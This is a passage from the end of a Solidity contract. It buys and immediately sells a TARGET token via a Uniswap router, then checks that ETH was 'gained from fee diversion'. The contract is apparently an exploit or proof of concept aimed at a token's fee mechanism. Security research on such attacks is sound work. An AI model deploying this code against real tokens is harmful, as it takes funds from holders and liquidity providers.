        if (contractTokenBalance > 0) {
            // Buy a small amount again
            IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 1 ether
            }(
                0,
                buyPath,
                address(this),
                block.timestamp
            );

            // And sell it immediately
            uint256 newBalance = IERC20(TARGET).balanceOf(address(this));
            if (newBalance > 0) {
                IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
                    newBalance,
                    0,
                    sellPath,
                    address(this),
                    block.timestamp
                );
            }
        }

        // Check final ETH balance
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, 'No ETH gained from fee diversion');
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

